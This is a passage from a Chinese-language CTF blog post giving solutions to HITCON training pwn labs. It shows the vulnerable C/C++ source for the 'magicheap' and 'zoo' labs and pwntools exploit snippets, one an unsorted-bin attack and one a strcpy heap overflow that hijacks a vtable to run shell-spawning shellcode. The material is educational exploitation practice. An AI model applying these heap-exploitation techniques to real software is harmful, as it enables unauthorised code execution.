idx &gt;= <span class="number">10</span>)&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">		_exit(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(heaparray[idx])&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Size of Heap : &quot;</span>);</span><br><span class="line">		read(<span class="number">0</span>,buf,<span class="number">8</span>);</span><br><span class="line">		size = atoi(buf);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Content of heap : &quot;</span>);</span><br><span class="line">		read_input(heaparray[idx] ,size);</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_heap</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> idx ;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">	read(<span class="number">0</span>,buf,<span class="number">4</span>);</span><br><span class="line">	idx = atoi(buf);</span><br><span class="line">	<span class="keyword">if</span>(idx &lt; <span class="number">0</span> || idx &gt;= <span class="number">10</span>)&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">		_exit(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(heaparray[idx])&#123;</span><br><span class="line">		<span class="built_in">free</span>(heaparray[idx]);</span><br><span class="line">		heaparray[idx] = <span class="literal">NULL</span> ;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">l33t</span><span class="params">()</span></span>&#123;</span><br><span class="line">	system(<span class="string">&quot;cat /home/magicheap/flag&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		menu();</span><br><span class="line">		read(<span class="number">0</span>,buf,<span class="number">8</span>);</span><br><span class="line">		<span class="keyword">switch</span>(atoi(buf))&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span> :</span><br><span class="line">				create_heap();</span><br><span class="line">				<span class="keyword">break</span> ;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span> :</span><br><span class="line">				edit_heap();</span><br><span class="line">				<span class="keyword">break</span> ;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span> :</span><br><span class="line">				delete_heap();</span><br><span class="line">				<span class="keyword">break</span> ;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">4</span> :</span><br><span class="line">				<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">				<span class="keyword">break</span> ;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">4869</span> :</span><br><span class="line">				<span class="keyword">if</span>(magic &gt; <span class="number">4869</span>)&#123;</span><br><span class="line">					<span class="built_in">puts</span>(<span class="string">&quot;Congrt !&quot;</span>);</span><br><span class="line">					l33t();</span><br><span class="line">				&#125;<span class="keyword">else</span></span><br><span class="line">					<span class="built_in">puts</span>(<span class="string">&quot;So sad !&quot;</span>);</span><br><span class="line">				<span class="keyword">break</span> ;</span><br><span class="line">			<span class="keyword">default</span> :</span><br><span class="line">				<span class="built_in">puts</span>(<span class="string">&quot;Invalid Choice&quot;</span>);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>在<code>edit</code>时没有检查<code>size</code>，可以堆溢出。题目要求bss段的<code>magic</code>大于0x1305，且输入数字等于0x1305，即可getshell。那么我们释放一个chunk到unsorted bin，利用堆溢出修改其<code>bk</code>为<code>magic-0x10</code>，再申请回来，那么<code>magic</code>就会被认为是下一个unsorted chunk的<code>fd</code>，被填入<code>main_arena+88</code>，这个值远超0x1305。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">magic = <span class="number">0x6020a0</span></span><br><span class="line">fd = <span class="number">0</span></span><br><span class="line">bk = magic<span class="number">-0x10</span></span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0x91</span>,fd,bk)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">sla(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x1305</span>))</span><br></pre></td></tr></table></figure>

<h2 id="lab15-zoo"><a href="#lab15-zoo" class="headerlink" title="lab15 - zoo"></a>lab15 - zoo</h2><p>源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> nameofzoo[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span> &#123;</span></span><br><span class="line">	<span class="keyword">public</span> :</span><br><span class="line">		Animal()&#123;</span><br><span class="line">			<span class="built_in">memset</span>(name,<span class="number">0</span>,<span class="number">24</span>);</span><br><span class="line">			weight = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">speak</span><span class="params">()</span></span>&#123;;&#125;</span><br><span class="line">		<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">info</span><span class="params">()</span></span>&#123;;&#125;</span><br><span class="line">	<span class="keyword">protected</span> :</span><br><span class="line">		<span class="keyword">char</span> name[<span class="number">24</span>];</span><br><span class="line">		<span class="keyword">int</span> weight;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> :</span> <span class="keyword">public</span> Animal&#123;</span><br><span class="line">	<span class="keyword">public</span> :</span><br><span class="line">		Dog(<span class="built_in">string</span> str,<span class="keyword">int</span> w)&#123;</span><br><span class="line">			<span class="built_in">strcpy</span>(name,str.c_str());</span><br><span class="line">			weight = w ;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">speak</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Wow ~ Wow ~ Wow ~&quot;</span> &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">info</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;|---------------------|&quot;</span> &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;| Animal info         |&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;|---------------------|&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  Weight :&quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;weight &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  Name : &quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;name &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;|---------------------|&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span> :</span> <span class="keyword">public</span> Animal&#123;</span><br><span class="line">	<span class="keyword">public</span> :</span><br><span class="line">		Cat(<span class="built_in">string</span> str,<span class="keyword">int</span> w)&#123;</span><br><span class="line">			<span class="built_in">strcpy</span>(name,str.c_str());</span><br><span class="line">			weight = w ;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">speak</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Meow ~ Meow ~ Meow ~&quot;</span> &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">info</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;|---------------------|&quot;</span> &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;| Animal info         |&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;|---------------------|&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  Weight :&quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;weight &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  Name : &quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;name &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;|---------------------|&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">vector</span>&lt;Animal *&gt; animallist ;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*********************************&quot;</span> &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; 1. Add a dog                    &quot;</span> &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; 2. Add a cat                    &quot;</span> &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; 3. Listen a animal              &quot;</span> &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; 4. Show a animal info           &quot;</span> &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; 5. Remove a animal              &quot;</span> &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; 6. Exit                         &quot;</span> &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*********************************&quot;</span> &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">adddog</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">string</span> name ;</span><br><span class="line">	<span class="keyword">int</span> weight ;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name : &quot;</span> ;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; name;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Weight : &quot;</span> ;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; weight ;</span><br><span class="line">	Dog *mydog = <span class="keyword">new</span> Dog(name,weight);</span><br><span class="line">	animallist.push_back(mydog);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">addcat</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">string</span> name ;</span><br><span class="line">	<span class="keyword">int</span> weight ;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name : &quot;</span> ;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; name;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Weight : &quot;</span> ;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; weight ;</span><br><span class="line">	Cat *mycat = <span class="keyword">new</span> Cat(name,weight);</span><br><span class="line">	animallist.push_back(mycat);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> idx ;</span><br><span class="line">	<span class="keyword">if</span>(animallist.size() == <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;no any animal!&quot;</span> &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;index of animal : &quot;</span>;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; idx ;</span><br><span class="line">	<span class="keyword">if</span>(idx &gt;= animallist.size())&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;out of bound !&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">delete</span> animallist[idx];</span><br><span class="line">	animallist.erase(animallist.begin()+idx);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">showinfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> idx ;</span><br><span class="line">	<span class="keyword">if</span>(animallist.size() == <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;no any animal!&quot;</span> &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;index of animal : &quot;</span>;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; idx ;</span><br><span class="line">	<span class="keyword">if</span>(idx &gt;= animallist.size())&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;out of bound !&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line">	animallist[idx]-&gt;info();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">listen</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> idx ;</span><br><span class="line">	<span class="keyword">if</span>(animallist.size() == <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;no any animal!&quot;</span> &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;index of animal : &quot;</span>;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; idx ;</span><br><span class="line">	<span class="keyword">if</span>(idx &gt;= animallist.size())&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;out of bound !&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line">	animallist[idx]-&gt;speak();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> choice ;</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name of Your zoo :&quot;</span> ;</span><br><span class="line">	read(<span class="number">0</span>,nameofzoo,<span class="number">100</span>);</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		menu();</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Your choice :&quot;</span>;</span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; choice ;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line">		<span class="keyword">switch</span>(choice)&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span> :</span><br><span class="line">				adddog();</span><br><span class="line">				<span class="keyword">break</span> ;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span> :</span><br><span class="line">				addcat();</span><br><span class="line">				<span class="keyword">break</span> ;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span> :</span><br><span class="line">				listen();</span><br><span class="line">				<span class="keyword">break</span> ;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">4</span> :</span><br><span class="line">				showinfo();</span><br><span class="line">				<span class="keyword">break</span> ;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">5</span> :</span><br><span class="line">				remove();</span><br><span class="line">				<span class="keyword">break</span> ;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">6</span> :</span><br><span class="line">				_exit(<span class="number">0</span>);</span><br><span class="line">			<span class="keyword">default</span> :</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Invaild choice&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="keyword">break</span> ;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>在<code>Dog</code>和<code>Cat</code>的构造函数中存在未检查长度的<code>strcpy</code>，因此可以堆溢出。同时，本题关闭了NX，而<code>Dog</code>中存在虚表指针，因此可以将其覆盖为<strong>shellcode地址的地址</strong>。那么shellcode和shellcode地址分别在哪呢？我们可以在程序第一次输入时布置shellcode，在后面跟上shellcode所在地址。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="number">0x605420</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">sla(<span class="string">&#x27;zoo&#x27;</span>,shellcode+p64(name))</span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">add()</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">72</span>+p64(name+<span class="built_in">len</span>(shellcode)))</span><br><span class="line">sla(<span class="string">&#x27;choice :&#x27;</span>,<span class="number">3</span>)</span><br><span class="line">sla(<span class="string">&#x27;:&#x27;</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure></div><div class="article-licensing box"><div class="licensing-title"><p>HITCONtraining</p><p><a href="https://signormercurio.me/post/HITCONtraining/">https://signormercurio.me/post/HITCONtraining/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>Mercury</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2020-02-16</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a class="" rel="noopener" target="_blank" title="CC BY-NC-SA 4.0" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/">栈迁移</a><a class="link-muted mr-2" rel="tag" href="/tags/fsb/">fsb</a><a class="link-muted mr-2" rel="tag" href="/tags/uaf/">uaf</a><a class="link-muted mr-2" rel="tag" href="/tags/double-free/">double-free</a><a class="link-muted mr-2" rel="tag" href="/tags/C-C/">C/C++</a><a class="link-muted mr-2" rel="tag" href="/tags/ROP/">ROP</a><a class="link-muted mr-2" rel="tag" href="/tags/off-by-one/">off-by-one</a><a class="link-muted mr-2" rel="tag" href="/tags/unlink/">unlink</a><a class="link-muted mr-2" rel="tag" href="/tags/House-of-Force/">House-of-Force</a><a class="link-muted mr-2" rel="tag" href="/tags/ORW/">ORW</a><a class="link-muted mr-2" rel="tag" href="/tags/unsortedbin-attack/">unsortedbin-attack</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/post/ACTF2019Pwn/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">ACTF2019 Pwn</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/post/MetasequoiaCTF2020/"><span class="level-item">MetasequoiaCTF2020 部分题解</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Comments</h3><div class="content" id="valine-thread"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script><script>new Valine({
            el: '#valine-thread' ,
            appId: "RkxCznUcvfzFBgfMiMr0BAfd-gzGzoHsz",
            appKey: "sw2sEPOl4haCAXKUFYiBFMrR",
            placeholder: "Leave comments here...",
            avatar: "mm",
            
            meta: ["nick","mail","link"],
            pageSize: 10,
            lang: "en",
            visitor: true,
            highlight: true,
            
            
            
            
            
            requiredFields: ["nick","mail"],
